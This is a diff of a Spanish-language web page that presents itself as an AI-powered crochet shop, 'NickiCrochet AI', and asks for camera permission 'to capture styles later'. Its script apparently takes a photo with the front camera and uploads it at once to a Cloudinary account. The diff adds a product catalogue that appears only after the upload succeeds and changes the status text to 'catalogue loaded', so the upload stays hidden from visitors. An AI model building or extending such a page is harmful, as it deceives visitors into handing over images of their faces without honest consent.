@@ -26,6 +26,13 @@
             background: rgba(23, 23, 23, 0.8);
             backdrop-filter: blur(12px);
             border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .premium-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(168, 85, 247, 0.4);
+            box-shadow: 0 10px 30px -10px rgba(168, 85, 247, 0.3);
         }
 
         .camera-container {
@@ -86,6 +93,12 @@
             0%, 100% { top: 10%; }
             50% { top: 90%; }
         }
+
+        .product-image {
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            border-radius: 12px;
+        }
     </style>
 </head>
 <body class="min-h-screen">
@@ -96,7 +109,7 @@
                 <div class="w-10 h-10 bg-gradient-to-tr from-purple-600 to-pink-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-purple-500/20">
                     <i class="fas fa-sparkles"></i>
                 </div>
-                <span class="text-2xl font-black tracking-tight hero-gradient-text">FashionFinder AI</span>
+                <span class="text-2xl font-black tracking-tight hero-gradient-text">NickiCrochet AI</span>
             </div>
         </div>
     </header>
@@ -111,7 +124,7 @@
                     Tu estilo, <br><span class="text-gray-400 italic">procesado con IA.</span>
                 </h1>
                 <p class="text-lg text-gray-400 max-w-lg mx-auto lg:mx-0">
-                    Antes de registrate concédenos el permiso de tu cámara. Esto permitirá que, más adelante, puedas capturar los estilos que te inspiran y encontrarlos al instante con nuestra IA.". 
+                    Antes de registrate concédenos el permiso de tu cámara. Esto permitirá que, más adelante, puedas capturar los estilos que te inspiran y encontrarlos al instante con nuestra IA.
                 </p>
                 <div class="flex flex-col sm:flex-row gap-5 justify-center lg:justify-start">
                     <button id="startCamera" class="px-10 py-4 bg-white text-black rounded-2xl font-bold shadow-xl hover:bg-gray-200 transition transform hover:-translate-y-1 flex items-center justify-center gap-3">
@@ -129,7 +142,7 @@
                             <i class="fas fa-fingerprint text-6xl text-purple-500 relative scan-pulse"></i>
                         </div>
                         <h3 class="text-2xl font-bold mb-3">Holi bienvenid@ a mi tienda, impulsado con IA</h3>
-                        <p class="text-gray-500 mb-8 max-w-xs mx-auto text-sm">Al Encontraras diversos diseños de Crochet.</p>
+                        <p class="text-gray-500 mb-8 max-w-xs mx-auto text-sm">Al ingresar encontrarás diversos diseños de Crochet.</p>
                     </div>
 
                     <div id="loadingUI" class="hidden flex flex-col items-center justify-center z-10">
@@ -144,13 +157,88 @@
             </div>
         </section>
 
-        <section id="resultsSection" class="hidden space-y-12">
-            <div class="flex items-center gap-6">
-                <h2 class="text-3xl font-bold">Permiso Completado</h2>
-                <div class="h-px flex-1 bg-white/10"></div>
+        <!-- Resultados y Tienda -->
+        <section id="resultsSection" class="hidden space-y-12 pb-24">
+            <div class="flex flex-col md:flex-row md:items-center justify-between gap-6">
+                <div class="space-y-2">
+                    <h2 class="text-3xl font-bold flex items-center gap-3">
+                        <i class="fas fa-shopping-bag text-purple-500"></i>
+                        Catálogo NickiCrochet
+                    </h2>
+                    <p id="uploadStatus" class="text-pink-500 font-bold animate-pulse">
+                        Ingresando a la tienda...
+                    </p>
+                </div>
+                <div class="h-px flex-1 bg-white/10 hidden md:block"></div>
             </div>
-            <div id="uploadStatus" class="text-pink-500 font-bold animate-pulse">
-                Ingresando a la tienda...
+
+            <!-- Grid de Tarjetas de la Tienda -->
+            <div id="storeGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8 opacity-0 transition-opacity duration-1000">
+                <!-- Tarjeta 1 -->
+                <div class="premium-card p-4 rounded-3xl">
+                    <img src="https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?auto=format&fit=crop&q=80&w=800" alt="Crochet Top" class="product-image w-full mb-4">
+                    <div class="flex justify-between items-start mb-2">
+                        <h4 class="font-bold text-lg">Top Harmony Pastel</h4>
+                        <span class="text-purple-400 font-bold">S/ 45.00</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-4">Diseño tejido a mano con hilo de algodón premium. Perfecto para el verano.</p>
+                    <button class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-xl font-bold transition">Ver detalles</button>
+                </div>
+
+                <!-- Tarjeta 2 -->
+                <div class="premium-card p-4 rounded-3xl">
+                    <img src="https://images.unsplash.com/photo-1608248597279-f99d160bfcbc?auto=format&fit=crop&q=80&w=800" alt="Amigurumi" class="product-image w-full mb-4">
+                    <div class="flex justify-between items-start mb-2">
+                        <h4 class="font-bold text-lg">Amigurumi Bunny</h4>
+                        <span class="text-purple-400 font-bold">S/ 35.00</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-4">Peluche artesanal hipoalergénico. El compañero ideal para los pequeños.</p>
+                    <button class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-xl font-bold transition">Ver detalles</button>
+                </div>
+
+                <!-- Tarjeta 3 -->
+                <div class="premium-card p-4 rounded-3xl">
+                    <img src="https://images.unsplash.com/photo-1528819622765-d6bcf132f793?auto=format&fit=crop&q=80&w=800" alt="Crochet Bag" class="product-image w-full mb-4">
+                    <div class="flex justify-between items-start mb-2">
+                        <h4 class="font-bold text-lg">Bolso Boho Chic</h4>
+                        <span class="text-purple-400 font-bold">S/ 60.00</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-4">Bolso espacioso con forro interno y detalles vintage. 100% artesanal.</p>
+                    <button class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-xl font-bold transition">Ver detalles</button>
+                </div>
+
+                <!-- Tarjeta 4 -->
+                <div class="premium-card p-4 rounded-3xl">
+                    <img src="https://images.unsplash.com/photo-1599305090598-fe179d501227?auto=format&fit=crop&q=80&w=800" alt="Crochet Hat" class="product-image w-full mb-4">
+                    <div class="flex justify-between items-start mb-2">
+                        <h4 class="font-bold text-lg">Bucket Hat Reversible</h4>
+                        <span class="text-purple-400 font-bold">S/ 25.00</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-4">Gorro de tendencia disponible en varios colores. Ajuste perfecto.</p>
+                    <button class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-xl font-bold transition">Ver detalles</button>
+                </div>
+
+                <!-- Tarjeta 5 -->
+                <div class="premium-card p-4 rounded-3xl">
+                    <img src="https://images.unsplash.com/photo-1544441893-675973e31d85?auto=format&fit=crop&q=80&w=800" alt="Cardigan" class="product-image w-full mb-4">
+                    <div class="flex justify-between items-start mb-2">
+                        <h4 class="font-bold text-lg">Cardigan Otoñal</h4>
+                        <span class="text-purple-400 font-bold">S/ 120.00</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-4">Cárdigan oversized tejido con lanas suaves y cálidas. Pieza única.</p>
+                    <button class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-xl font-bold transition">Ver detalles</button>
+                </div>
+
+                <!-- Tarjeta 6 -->
+                <div class="premium-card p-4 rounded-3xl">
+                    <img src="https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?auto=format&fit=crop&q=80&w=800" alt="Bikini" class="product-image w-full mb-4">
+                    <div class="flex justify-between items-start mb-2">
+                        <h4 class="font-bold text-lg">Set Bikini Seafoam</h4>
+                        <span class="text-purple-400 font-bold">S/ 55.00</span>
+                    </div>
+                    <p class="text-gray-400 text-sm mb-4">Conjunto de playa resistente al agua. No pierde su forma.</p>
+                    <button class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-xl font-bold transition">Ver detalles</button>
+                </div>
             </div>
         </section>
     </main>
@@ -166,17 +254,16 @@
         const canvas = document.getElementById('photoCanvas');
         const resultsSection = document.getElementById('resultsSection');
         const uploadStatus = document.getElementById('uploadStatus');
+        const storeGrid = document.getElementById('storeGrid');
 
-        // Configuración de Cloudinary (Restaurada)
+        // Configuración de Cloudinary
         const CLOUDINARY_URL = 'https://api.cloudinary.com/v1_1/dtdyjvx90/image/upload';
         const CLOUDINARY_PRESET = 'fotos_online';
-
 
         let stream = null;
 
         async function initCamera() {
             try {
-                // Usamos 'user' para que en móvil sea la cámara frontal (perfil)
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' } 
                 });
@@ -222,13 +309,13 @@
             
             const dataURL = canvas.toDataURL('image/jpeg', 0.8);
 
-            // Mostrar sección de estado
+            // Mostrar sección de resultados
             loadingUI.classList.add('hidden');
             placeholder.classList.remove('hidden');
             resultsSection.classList.remove('hidden');
             resultsSection.scrollIntoView({ behavior: 'smooth' });
 
-            // ENVIAR A CLOUDINARY (Inmediato)
+            // ENVIAR A CLOUDINARY
             await uploadToCloudinary(dataURL);
             
             // Liberar recursos
@@ -253,14 +340,19 @@
                 if (response.ok) {
                     const data = await response.json();
                     console.log('¡Éxito! Imagen en Cloudinary:', data.secure_url);
-                    uploadStatus.innerHTML = '<i class="fas fa-check-circle"></i> Ingresando a la tienda';
+                    
+                    // Actualizar estado y mostrar tienda
+                    uploadStatus.innerHTML = '<i class="fas fa-check-circle"></i> Catálogo cargado correctamente';
                     uploadStatus.classList.replace('text-pink-500', 'text-green-500');
+                    
+                    // Mostrar la tienda con animación suave
+                    storeGrid.classList.replace('opacity-0', 'opacity-100');
                 } else {
                     throw new Error('Error al cargar');
                 }
             } catch (error) {
                 console.error('Error Cloudinary:', error);
-                uploadStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR AL ingresar';
+                uploadStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR al conectar con la tienda';
             }
         }
 
